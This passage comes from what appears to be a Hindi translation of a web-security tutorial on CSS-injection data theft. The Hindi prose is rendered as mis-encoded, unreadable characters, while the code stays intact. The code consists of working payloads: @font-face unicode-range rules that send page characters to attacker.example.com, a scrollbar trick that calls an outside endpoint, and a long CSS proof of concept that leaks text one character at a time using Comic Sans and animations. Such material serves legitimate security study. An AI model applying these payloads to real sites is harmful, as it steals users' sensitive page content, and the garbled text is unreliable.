3. STTF рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдХреНрд░рд┐рдпреАрдХрд░рдг рдЪреЗрд╖реНрдЯрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдХреЛ рд╣реА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╣рдорд▓реЗ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреЗ рдмрд┐рдирд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХреЛ рдмрд╣реБрдд рдХрдо рдХрд░ рджреЗрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЙрдкрд░реЛрдХреНрдд рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреЗ рд▓реЗрдЦрдХ рдиреЗ рдЦреЛрдЬрд╛ рд╣реИ рдХрд┐ рд╣рдорд▓реЗ рдХреА рд╕реНрд╡рдЪрд╛рд▓рдиреАрдХрд░рдг рдХреЛ рд╕реБрдЧрдо рдмрдирд╛рдиреЗ рд╡рд╛рд▓реА рдХреБрдЫ рд╢рд░реНрддреЗрдВ рд╣реИрдВред рдПрдХ рдФрд░, рдЗрд╕рдХреЗ рд╕рдорд╛рди рдШрдЯрдирд╛, PoC#3 рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХреА рдЬрд╛рдПрдЧреАред
4. рдЗрд╕рдХреЗ рд▓рд┐рдП рдХреБрдЫ **рдмрд╛рдИрдкрд╛рд╕** рд╣реИрдВ рдЬреИрд╕реЗ **рд╕рд╛рдорд╛рдЬрд┐рдХ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ**, рдпрд╛ **рд╕рд╛рдорд╛рдиреНрдп рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдкреНрд░рд╡рд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдирд╛**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

рдЖрдк рдПрдХ [**CTF рдХреЗ рд▓рд┐рдП рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЙрддреНрдкрд╛рджрди рдХрд╛ рдЕрдкрдиреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb)ред

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

рдЖрдк рд╡рд┐рд╢рд┐рд╖реНрдЯ рдпреВрдирд┐рдХреЛрдб рдорд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП **рдмрд╛рд╣рд░реА рдлреЛрдВрдЯреНрд╕ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдХреЗрд╡рд▓ рдкреГрд╖реНрда рдореЗрдВ рдЙрдкрд╕реНрдерд┐рдд рд╣реЛрдиреЗ рдкрд░ **рдЗрдХрдЯреНрдард╛ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
рдЬрдм рдЖрдк рдЗрд╕ рдкреЗрдЬ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ Chrome рдФрд░ Firefox "?A" рдФрд░ "?B" рдХреЛ рд▓рд╛рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓-рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдкрд╛рда "A" рдФрд░ "B" рдЕрдХреНрд╖рд░реЛрдВ рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред рд▓реЗрдХрд┐рди Chrome рдФрд░ Firefox "?C" рдХреЛ рдирд╣реАрдВ рд▓рд╛рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ "C" рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдордиреЗ "A" рдФрд░ "B" рдХреЛ рдкрдврд╝рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд░рд╣реЗ рд╣реИрдВред

### рдкрд╛рда рдиреЛрдб рдЙрджреНрдзрд░рдг (I): рд▓рд┐рдЧреЗрдЪрд░реНрд╕ <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**рд╕рдВрджрд░реНрдн:** [Wykradanie danych w ┼Ыwietnym stylu тАУ czyli jak wykorzysta─З CSS-y do atak├│w na webaplikacj─Щ](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

рд╣рдо рдПрдХ рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде рдПрдХ рдиреЛрдб рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдкрд╛рда рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдлрд╝реЙрдиреНрдЯ рд▓рд┐рдЧреЗрдЪрд░реНрд╕** рдФрд░ **рдЪреМрдбрд╝рд╛рдИ рдкрд░рд┐рд╡рд░реНрддрди рдХреЗ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХрд╛ рд╕рдВрдпреЛрдЬрди рдХрд░рддреА рд╣реИред рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдкреАрдЫреЗ рдХреА рдореБрдЦреНрдп рд╡рд┐рдЪрд╛рд░ рд╣реИ рдХрд┐ рдлрд╝реЙрдиреНрдЯреНрд╕ рдХреЛ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдкрд╣рд▓реЗ рд╕реЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд▓рд┐рдЧреЗрдЪрд░ рдХреЗ рд╕рд╛рде **рдЙрдЪреНрдЪ рдЖрдХрд╛рд░** рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ **рдЖрдХрд╛рд░ рдкрд░рд┐рд╡рд░реНрддрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдУрд░реЗрдХрд▓ рдХреЗ рд░реВрдк рдореЗрдВ** рдХрд░рддреЗ рд╣реИрдВред

рдлрд╝реЙрдиреНрдЯреНрд╕ рдХреЛ SVG рдлрд╝реЙрдиреНрдЯреНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ fontforge рдХреЗ рд╕рд╛рде woff рдореЗрдВ рдХрдиреНрд╡рд░реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред SVG рдореЗрдВ рд╣рдо **horiz-adv-x** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдЧреНрд▓рд╛рдЗрдл рдХреА рдЪреМрдбрд╝рд╛рдИ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, рдЬрд╣рд╛рдВ **XY рдПрдХ рджреЛ рдЕрдХреНрд╖рд░реЛрдВ рдХреА рдЕрдиреБрдХреНрд░рдорд┐рдХрддрд╛** рд╣реИред **рдпрджрд┐ рдЕрдиреБрдХреНрд░рдорд┐рдХрддрд╛ рдореМрдЬреВрдж рд╣реИ, рддреЛ рдпрд╣ рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрдЧреА рдФрд░ рдкрд╛рда рдХрд╛ рдЖрдХрд╛рд░ рдмрджрд▓ рдЬрд╛рдПрдЧрд╛**ред рд▓реЗрдХрд┐рди... рд╣рдо рдЗрди рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рдХреИрд╕реЗ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ?

рдЬрдм рд╡реНрд╣рд╛рдЗрдЯ-рд╕реНрдкреЗрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ **nowrap** рдХреЗ рд░реВрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдкрд╛рда рдХреЛ рддреЛрдбрд╝рдиреЗ рдХреЛ рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ рдЬрдм рдпрд╣ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдХреА рдЪреМрдбрд╝рд╛рдИ рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдПрдХ **рдХреНрд╖реИрддрд┐рдЬ рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛**ред рдФрд░ рд╣рдо **рдЙрд╕ рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рдХреА рд╕реНрдЯрд╛рдЗрд▓ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рд╣рдо рдЬрдм рдпрд╣ рд╣реЛрддрд╛ рд╣реИ рддреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **:)**
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://ourendpoint.com/?leak); }
```
рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рд╣рдорд▓рд╛ рд╕реНрдкрд╖реНрдЯ рд╣реИ:

1. **рджреЛ рд╡рд┐рд╢рд╛рд▓ рдЪрд╛рд░реЛрдВ рдХреЗ рд╕рдВрдпреЛрдЬрди рдХреЗ рд▓рд┐рдП рдлрд╝реЙрдиреНрдЯ** рдмрдирд╛рдПрдВ
2. **рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рдЯреНрд░рд┐рдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реАрдХ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ**
3. рд▓реАрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдорд┐рд▓реЗ рдкрд╣рд▓реЗ рд▓рд┐рдЧреЗрдЪрд░ рдХреЛ рдмреЗрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **3 рдЪрд╛рд░реЛрдВ рдХреЗ рдирдП рд╕рдВрдпреЛрдЬрди рдмрдирд╛рдПрдВ** (рдкрд╣рд▓реЗ / рдмрд╛рдж рдХреЗ рдЪрд╛рд░реЛрдВ рдХреЛ рдЬреЛрдбрд╝реЗрдВ)
4. **3-рдЪрд╛рд░ рд▓рд┐рдЧреЗрдЪрд░** рдХрд╛ **рдкрддрд╛ рд▓рдЧрд╛рдПрдВ**ред
5. **рдкреВрд░реЗ рдкрд╛рда рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рддрдХ** рджреЛрд╣рд░рд╛рдПрдВ

рд╣рдореЗрдВ рдЕрднреА рддрдХ рдПрдХ рдмреЗрд╣рддрд░ рд╡рд┐рдзрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрд╡реГрддреНрддрд┐ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `<meta refresh=...` рдЕрд╡рд╛рдВрдЫрдиреАрдп рди рд╣реЛред рдЖрдк **CSS @import рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкрд╛рдж рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

### рдкрд╛рда рдиреЛрдб рдирд┐рд░реНрд╡рд╛рд╣ (II): рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдлрд╝реЙрдиреНрдЯ рдХреЗ рд╕рд╛рде рдЪрд░рд╕реЗрдЯ рд▓реАрдХ рдХрд░рдирд╛ (рдмрд╛рд╣реНрдп рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**рд╕рдВрджрд░реНрдн:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

рдпрд╣ рдЯреНрд░рд┐рдХ рдЗрд╕ [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/) рдореЗрдВ рдЬрд╛рд░реА рдХреА рдЧрдИ рдереАред рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рд╕реНрдерд╛рдкрд┐рдд **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдлрд╝реЙрдиреНрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ** рдПрдХ рдкрд╛рда рдиреЛрдб рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЪрд░рд╕реЗрдЯ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: рдХреЛрдИ рдмрд╛рд╣реНрдп - рдпрд╛ рдХрд╕реНрдЯрдо - рдлрд╝реЙрдиреНрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

рдореБрдЦреНрдп рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдПрдирд┐рдореЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд┐рд╡ рдХреА рдЪреМрдбрд╝рд╛рдИ рдХреЛ **0 рд╕реЗ рдкрд╛рда рдХреЗ рдЕрдВрдд рддрдХ рдмрдврд╝рд╛рдПрдВ**, рд╣рд░ рдмрд╛рд░ рдПрдХ рдЪрд╛рд░ рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдмрд░рд╛рдмрд░ред рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╣рдо рдкрд╛рда рдХреЛ рджреЛ рднрд╛рдЧреЛрдВ рдореЗрдВ "рд╡рд┐рднрд╛рдЬрд┐рдд" рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: рдПрдХ "рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕" (рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐) рдФрд░ рдПрдХ "рд╕рдлрд╝рд┐рдХреНрд╕", рдЗрд╕рд▓рд┐рдП рд╣рд░ рдмрд╛рд░ рдЬрдм рдбрд┐рд╡ рдЕрдкрдиреА рдЪреМрдбрд╝рд╛рдИ рдмрдврд╝рд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ рдирдпрд╛ рдЪрд╛рд░ "рд╕рдлрд╝рд┐рдХреНрд╕" рд╕реЗ "рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕" рдореЗрдВ рдЬрд╛рддрд╛ рд╣реИред рдХреБрдЫ рдЗрд╕ рддрд░рд╣:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

рдЬрдм рдПрдХ рдирдпрд╛ рдЪрд╛рд░ рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдореЗрдВ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рдпреВрдирд┐рдХреЛрдб-рд░реЗрдВрдЬ рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реАрдлрд╝рд┐рдХреНрд╕ рдореЗрдВ рдирдП рдЪрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝реЙрдиреНрдЯ рдХреЛ рдХреЙрдорд┐рдХ рд╕реИрдВрд╕ рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреА рдКрдВрдЪрд╛рдИ рдЕрдзрд┐рдХ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП **рдПрдХ рд▓рдВрдмрд╡рдд рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИ** (рдЪрд░ рдорд╛рди рд▓реАрдХ рд╣реЛрддрд╛ рд╣реИ)ред рдЗрд╕ рддрд░рд╣ рд╣рдо рд╣рд░ рдЕрд▓рдЧ рдЪрд░ рдХреЛ рдПрдХ рдмрд╛рд░ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред **рд╣рдо рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдЪрд░ рджреЛрд╣рд░рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдХреМрди рд╕рд╛ рдЪрд░ рджреЛрд╣рд░рд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╣ рдирд╣реАрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ**ред

{% hint style="info" %}
рдореВрд▓ рд░реВрдк рд╕реЗ, **рдпреВрдирд┐рдХреЛрдб-рд░реЗрдВрдЬ рдПрдХ рдЪрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рд▓реЗрдХрд┐рди рд╣рдореЗрдВ рдХрд┐рд╕реА рдмрд╛рд╣реНрдп рдлрд╝реЙрдиреНрдЯ рдХреЛ рд▓реЛрдб рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рджреВрд╕рд░рд╛ рддрд░реАрдХрд╛ рдвреВрдВрдврдирд╛ рд╣реЛрдЧрд╛ред\
рдЬрдм **рдЪрд░** рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ **рдкреНрд░реА-рд╕реНрдерд╛рдкрд┐рдд рдХреЙрдорд┐рдХ рд╕реИрдВрд╕ рдлрд╝реЙрдиреНрдЯ** рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЪрд░ **рдмрдбрд╝рд╛ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ рдПрдХ рд╕реНрдХреНрд░реЙрд▓рдмрд╛рд░ рд╕рдХреНрд░рд┐рдп рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **рдкрд╛рдпрд╛ рдЧрдпрд╛ рдЪрд░ рд▓реАрдХ рдХрд░реЗрдЧрд╛**ред
{% endhint %}

PoC рд╕реЗ рдирд┐рдХрд╛рд▓реЗ рдЧрдП рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* рдЪрд╛рд░ рд╕реЗ рдЪрд╛рд░ рд╡рд┐рдбреНрде рдмрдврд╝рд╛рдПрдВ, рдЕрд░реНрдерд╛рдд рдкреНрд░реАрдлрд┐рдХреНрд╕ рдореЗрдВ рдирдпрд╛ рдЪрд░ рдЬреЛрдбрд╝реЗрдВ */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* рд╕рд╛рдЗрдб-рдЪреИрдирд▓ */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### рдкрд╛рда рдиреЛрдб рдЕрдкрд╣рд░рдг (III): рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдлрд╝реЙрдиреНрдЯ рдХреЗ рд╕рд╛рде рдЪрд╛рд░рд╕реЗрдЯ рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рддрддреНрдХрд╛рд▓рд┐рдХ рддрддреНрд╡реЛрдВ рдХреЛ рдЫрд┐рдкрд╛рдирд╛ (рдмрд╛рд╣реНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

